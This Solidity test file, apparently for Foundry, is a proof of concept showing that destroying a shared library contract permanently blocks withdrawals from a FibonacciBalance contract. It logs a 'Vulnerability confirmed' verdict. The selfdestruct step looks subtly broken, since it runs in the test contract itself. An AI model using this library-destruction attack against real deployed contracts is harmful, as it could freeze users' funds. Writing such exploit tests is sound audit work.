import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract FibonacciBalanceTest is Test {
    FibonacciBalance fibBalance;
    FibonacciLib fibLib;

    address user = address(0x123);
    uint256 initialDeposit = 1 ether;

    function setUp() public {
        // Deploy required contracts
        fibLib = new FibonacciLib();
        fibBalance = new FibonacciBalance{value: initialDeposit}(address(fibLib));

        // Make our test user deposit funds
        vm.deal(user, initialDeposit);
        vm.prank(user);
        fibBalance.deposit{value: initialDeposit}();
    }

    function testWithdrawFail() public {
        console.log("--- BEFORE-Trigger Withdrawal ---");
        // Record pre-withdrawal state
        uint256 userBalanceBefore = user.balance;
        uint256 contractBalanceBefore = address(fibBalance).balance;
        uint256 withdrawalCounterBefore = fibBalance.withdrawalCounter();

        console.log("User balance before:", userBalanceBefore);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Withdrawal counter before:", withdrawalCounterBefore);

        // Attempt first withdrawal (should succeed)
        console.log("Attempting first withdrawal...");
        vm.prank(user);
        fibBalance.withdraw();

        // Record post-first-withdrawal state
        uint256 userBalanceAfterFirst = user.balance;
        uint256 contractBalanceAfterFirst = address(fibBalance).balance;
        uint256 withdrawalCounterAfterFirst = fibBalance.withdrawalCounter();

        console.log("User balance after first withdrawal:", userBalanceAfterFirst);
        console.log("Contract balance after first withdrawal:", contractBalanceAfterFirst);
        console.log("Withdrawal counter after first withdrawal:", withdrawalCounterAfterFirst);

        // Verify counter increased
        bool firstWithdrawWorked = withdrawalCounterAfterFirst == withdrawalCounterBefore + 1;
        console.log("First withdrawal status:", firstWithdrawWorked ? "SUCCESS" : "FAILED");

        console.log("--- Trigger: Destroy FibonacciLib ---");
        // Destroy the FibonacciLib contract
        vm.prank(address(fibLib));
        selfdestruct(payable(user));

        console.log("--- AFTER-Trigger: Attempt Withdrawal ---");
        // Record state after library destruction
        uint256 userBalanceAfterDestroy = user.balance;
        uint256 contractBalanceAfterDestroy = address(fibBalance).balance;
        uint256 withdrawalCounterAfterDestroy = fibBalance.withdrawalCounter();

        console.log("User balance before second withdrawal:", userBalanceAfterDestroy);
        console.log("Contract balance before second withdrawal:", contractBalanceAfterDestroy);
        console.log("Withdrawal counter before second withdrawal:", withdrawalCounterAfterDestroy);

        // Attempt second withdrawal (should fail)
        console.log("Attempting second withdrawal (should revert)...");
        vm.prank(user);
        vm.expectRevert();
        fibBalance.withdraw();

        // Record final state
        uint256 userFinalBalance = user.balance;
        uint256 contractFinalBalance = address(fibBalance).balance;
        uint256 withdrawalFinalCounter = fibBalance.withdrawalCounter();

        console.log("User balance after second withdrawal:", userFinalBalance);
        console.log("Contract balance after second withdrawal:", contractFinalBalance);
        console.log("Withdrawal counter after second withdrawal:", withdrawalFinalCounter);

        // Compare states
        bool secondWithdrawFailed = 
            userFinalBalance == userBalanceAfterDestroy &&
            contractFinalBalance == contractBalanceAfterDestroy &&
            withdrawalFinalCounter == withdrawalCounterAfterDestroy;

        bool firstWithdrawSuccess = withdrawalCounterAfterFirst == withdrawalCounterBefore + 1;

        console.log("First withdrawal succeeded:", firstWithdrawSuccess ? "YES" : "NO");
        console.log("Second withdrawal failed (no state change):", secondWithdrawFailed ? "YES" : "NO");

        // Final verdict
        if (firstWithdrawSuccess && secondWithdrawFailed) {
            console.log("Vulnerability confirmed: Library destruction breaks withdrawals");
            console.log("Vulnerability Exists: Non-owner destroyed library, locking withdrawal functionality");
        } else {
            console.log("Vulnerability not Exist: Withdrawal functionality was not broken after library destruction");
        }
    }
}
```

